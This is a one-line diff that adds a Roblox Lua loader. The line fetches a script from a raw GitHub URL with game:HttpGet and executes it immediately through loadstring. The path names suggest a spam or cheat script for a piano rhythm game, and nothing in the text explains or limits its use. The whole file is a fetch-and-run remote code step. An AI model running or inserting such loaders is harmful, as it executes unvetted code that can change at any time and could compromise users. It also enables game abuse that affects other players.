@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/piano-rhythm-tiles-spam5-cem0dvajo9mrl2.lua"))()
